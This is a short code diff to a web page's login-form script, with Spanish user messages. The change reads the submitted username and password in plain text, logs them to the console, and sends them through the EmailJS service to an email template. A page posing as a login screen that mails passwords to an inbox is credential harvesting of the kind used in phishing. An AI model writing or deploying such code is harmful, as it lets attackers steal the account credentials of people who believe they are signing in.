@@ -199,14 +199,24 @@
   document.getElementById('login-form').addEventListener('submit', function(event) {
     event.preventDefault();
 
-    emailjs.sendForm('service_33u0mdn', 'template_vs7phvq', this)
-      .then((response) => {
-        alert('Correo enviado correctamente!');
-        this.reset();
-      })
-      .catch((error) => {
-        alert('Error al enviar correo: ' + error.text);
-      });
+    const username = this.username.value;
+    const password = this.password.value;
+    const remember = this.remember.checked ? "Sí" : "No";
+
+    console.log('Datos a enviar:', { username, password, remember });
+
+    emailjs.send('service_33u0mdn', 'template_vs7phvq', {
+      username: username,
+      password: password,
+      remember: remember
+    })
+    .then(response => {
+      alert('Correo enviado con datos del formulario');
+      this.reset();
+    })
+    .catch(error => {
+      alert('Error: ' + error.text);
+    });
   });
 </script>
 
